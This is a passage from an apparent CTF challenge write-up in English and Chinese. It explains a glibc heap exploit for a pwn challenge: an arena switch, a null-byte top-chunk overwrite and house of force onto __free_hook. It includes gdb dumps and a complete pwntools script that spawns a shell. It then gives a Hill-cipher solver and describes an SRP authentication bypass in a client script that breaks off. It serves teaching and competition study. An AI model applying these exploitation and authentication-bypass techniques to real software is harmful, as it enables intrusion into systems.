`s[len-1]=0` is equal to `*(char*)(len-1)=0`, which means we can write a `x00`
to almost arbitrary address.
####  Exploit
The leak is easy, and I will skip that part.
Suppose now we have the address of libc `libc_base` and heap `heap_base`, what
do we do next?
The first idea that comes to me is `house of force` —- by partial overwrite a
`x00` to the top chunk ptr. But after we do that ,we find that the main arena
seems not working anymore..
Here’s a useful POC:
    int main(){
        printf("Before:n");
        printf("%pn",malloc(0x40));
        printf("Mallco failed:%pn",malloc(-1));
        printf("After:n");
        printf("%pn",malloc(0x40));
        return 0;
    }
    Before:
    0xee7420
    Mallco failed:(nil)
    After:
    0x7fb7b00008c0
The pointer malloc returns is `0x7fb7b00008c0` ??!
You can read the source of glibc for more details. In a word, when you malloc
a size that the main arena can’t handle, malloc will try to use another arena.
And later allocations will all be handled by the arena. The insteresting part
is that, after you switch the arena, if you malloc a extremely big size again,
the arena will not change anymore! That means we can partial overwrite the top
chunk pointer of this arena and use `house of force`!
A little debugging after leak the address of another arena (in this case
`0x7f167c000020`)  
Almost same as main arena
    gdb-peda$ telescope 0x7f167c000020 100
    0000| 0x7f167c000020 --> 0x200000000 
    0008| 0x7f167c000028 --> 0x0 
    0016| 0x7f167c000030 --> 0x0 
    0024| 0x7f167c000038 --> 0x0 
    0032| 0x7f167c000040 --> 0x0 
    0040| 0x7f167c000048 --> 0x0 
    0048| 0x7f167c000050 --> 0x7f167c0008b0 --> 0x0 
    0056| 0x7f167c000058 --> 0x0 
    0064| 0x7f167c000060 --> 0x0 
    0072| 0x7f167c000068 --> 0x0 
    0080| 0x7f167c000070 --> 0x0 
    0088| 0x7f167c000078 --> 0x7f167c000920 --> 0x0 
    0096| 0x7f167c000080 --> 0x0 
    0104| 0x7f167c000088 --> 0x7f167c000078 --> 0x7f167c000920 --> 0x0 
    0112| 0x7f167c000090 --> 0x7f167c000078 --> 0x7f167c000920 --> 0x0 
    0120| 0x7f167c000098 --> 0x7f167c000088 --> 0x7f167c000078 --> 0x7f167c000920 --> 0x0 
    0128| 0x7f167c0000a0 --> 0x7f167c000088 --> 0x7f167c000078 --> 0x7f167c000920 --> 0x0 
    ..............
Write the top chunk pointer
    gdb-peda$ telescope 0x7f167c000020 100
    0000| 0x7f167c000020 --> 0x200000000 
    0008| 0x7f167c000028 --> 0x7f167c0008b0 --> 0x0 
    0016| 0x7f167c000030 --> 0x0 
    0024| 0x7f167c000038 --> 0x0 
    0032| 0x7f167c000040 --> 0x0 
    0040| 0x7f167c000048 --> 0x0 
    0048| 0x7f167c000050 --> 0x0 
    0056| 0x7f167c000058 --> 0x0 
    0064| 0x7f167c000060 --> 0x0 
    0072| 0x7f167c000068 --> 0x0 
    0080| 0x7f167c000070 --> 0x0 
    0088| 0x7f167c000078 --> 0x7f167c000a00 --> 0x7f168bfa729a 
    0096| 0x7f167c000080 --> 0x7f167c0008d0 --> 0x0 
    0104| 0x7f167c000088 --> 0x7f167c0008d0 --> 0x0 
    0112| 0x7f167c000090 --> 0x7f167c0008d0 --> 0x0 
    0120| 0x7f167c000098 --> 0x7f167c000088 --> 0x7f167c0008d0 --> 0x0 
    0128| 0x7f167c0000a0 --> 0x7f167c000088 --> 0x7f167c0008d0 --> 0x0 
    ....
    gdb-peda$ telescope 0x7f167c000a00
    0000| 0x7f167c000a00 --> 0x7f168bfa729a 
    0008| 0x7f167c000a08 --> 0x7f168bfa729a 
    0016| 0x7f167c000a10 --> 0x7f168bfa729a 
    0024| 0x7f167c000a18 --> 0x7f168bfa729a
You can see that instead of size `0xFFFFFFFFFFFFFFF`, I fake the size to be
`0x7f168bfa729a`. This is a little confusing? Actually I calculate the size as
`onegadget+(freehook_addr top_chunk_addr)`.  
This means that if I `malloc(freehook_addr-top_chunk_addr)`, the size left
happens to be `onegadget` ,and it locates in the address of `freehook`!This is
really hackish. Trigger `free` and you can get the shell.
Of course you can also write `system` into `freehook`.Although actually you
can’t write exactly `system` but `system+1` into `freehook`, because the prev
inused bit of the top chunk is always set.But it won’t stop you from getting a
shell. Try it yourself!
####  Final Script
    from pwn import *
    pc='./noend'
    libc=ELF('./libc.so.6')
    p=process(pc,env={"LD_PRELOAD":'./libc.so.6'})
    gdb.attach(p,'c')
    #p=remote("pwn.suctf.asuri.org",20002)
    def ru(a):
        p.recvuntil(a)
    def sa(a,b):
        p.sendafter(a,b)
    def sla(a,b):
        p.sendlineafter(a,b)
    def echo(size,content):
        p.sendline(str(size))
        sleep(0.3)
        p.send(content)
        k=p.recvline()
        return k
    def hack():
        echo(0x38,'A'*8)
        echo(0x28,'A'*8)
        echo(0x48,'A'*8)
        echo(0x7f,'A'*8)    
        k=echo(0x28,'A'*8)    
        libcaddr=u64(k[8:16])
        libc.address=libcaddr-0x3c1b58
        print("Libc base-->"+hex(libc.address))
        p.sendline(str(libcaddr-1))
        sleep(0.3)
        echo(0x38,'A'*8)    
        p.clean()
        echo(0x68,'A'*8)    
        echo(0x48,'A'*8)    
        echo(0x7f,'A'*8)    
        k=echo(0x68,'A'*8)    
        libcaddr=u64(k[8:16])
        old=libcaddr
        print("Another arena-->"+hex(old))
        raw_input()
        target=libc.address+0xf2519+0x10+1 # onegadget
        libcaddr=libcaddr-0x78+0xa00
        off=libc.symbols['__free_hook']-8-0x10-libcaddr
        echo(0xf0,p64(off+target)*(0xf0/8))
        p.sendline(str(old+1))
        sleep(1)
        p.sendline()
        raw_input()
        echo(off,'AAAA')
        p.recvline()
        p.clean()
        echo(0x10,'/bin/shx00')
        p.interactive()
    hack()
It is a little pity that nobody solves the challenge `heapprint`. But what we
learned is what matters. So hope you guys enjoy the challenges I make. Feel
free to contact me if you have any question.
## Crypto
###  Magic
本题依据原理为Hill密码。magic使用希尔密码对明文字符串加密，获得密文。加密的秘钥是一个有限域GF(2)中的矩阵M，设明文为向量p，则加密后得到的密文向量为c=Mp。出题过程依据的便是该公式。若已知c，若要求p，则在两边同时乘以M的逆矩阵M^(-1)，便得到p=M^(-1)
c。下面的解题代码中先从magic.txt文件中读取矩阵M，将其转换成0、1矩阵的形式，再利用SageMath求解M的逆矩阵（SageMath脚本略），之后乘以向量c得到明文向量。代码如下
    def getCipher():
        with open("cipher.txt") as f:
            s = f.readline().strip()
        s = int(s, 16)
        return s
    def getMagic():
        magic = []
        with open("magic.txt") as f:
            while True:
                line = f.readline()
                if (line):
                    line = int(line, 16)
                    magic.append(line)
                    # print bin(line)[2:]
                else:
                    break
        return magic
    def magic2Matrix(magic):
        matrix = ""
        for i in range(len(magic)):
            t = magic[i]
            row = ""
            for j in range(len(magic)):
                element = t & 1
                row = ", " + str(element) + row
                t = t >> 1
            row = "[" + row[2:] + "]"
            matrix = matrix + row + ",n"
        matrix = "[" + matrix[:-1] + "]"
        with open("matrix.txt", "w") as f:
            f.write(matrix)
    def prepare():
        magic = getMagic()
        magic2Matrix(magic)
        cipher = getCipher()
        cipherVector = ""
        for i in range(len(magic)):
            element = cipher & 1
            cipherVector = ", " + str(element) + cipherVector
            cipher = cipher >> 1
        cipherVector = "[" + cipherVector[2:] + "]"
        with open("cVector.txt", "w") as f:
            f.write(cipherVector)
    def trans2Flag():
        #此处的向量v由SageMath计算得来
        v = [0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1,
    0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1,
    0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 1,
    0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1,
    0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0,
    0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0,
    0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0,
    0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1,
    0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1,
    0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0,
    0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1]
        flag = 0
        for i in range(len(v)):
            flag = flag << 1
            flag = flag ^ v[i]
        flag = hex(flag)[2 : -1]
        flag = flag.decode("hex")
        print flag
    if __name__ == "__main__":
        prepare()#该步骤用于从magic中读取矩阵M，写入到matrix.txt中，之后到SageMath中计算
        trans2Flag()#将明文向量转换成flag字符串
###  Pass
本题依据的原理是SRP（Security Remote Password）的一个缺陷。SRP的基本原理如下，客户端计算SCarol = (B −
kgx)(a + ux) = (kv + gb − kgx)(a + ux) = (kgx − kgx + gb)(a + ux) = (gb)(a +
ux)；服务器端计算SSteve = (Avu)b = (gavu)b = [ga(gx)u]b = (ga + ux)b = (gb)(a +
ux)，之后分别计算S的Hash值K，计算K||salt的hash值h。双方最后通过验证h是否一致来实现password验证和身份认证，本质上是Diffie-Hellman秘钥交换的一种演变，都是利用离散对数计算复杂度高实现的密码机制。该缺陷在于若客户端将A强行设置为0或者N的整数倍，那么服务器端计算得到的S
SSteve
必为0，此时客户端再将本地的S强行设置为0，便可以得到与服务器端相同的S，进而得到相同的K和相同的h，进而通过服务器端的password验证。在本题的设计中，一旦通过服务器端验证，服务器会发送本题的flag。解题代码如下。
     -*- coding: UTF-8 -*-    # 文件名：client.py
    #恶意攻击者，将A设置为0、N或者其他N的倍数，导致服务器端计算S时得到的值一定是0；攻击者进一步将自己的S值也设置为0，
    import socket
    import gmpy2 as gm
    import hashlib
    import agree
    def main():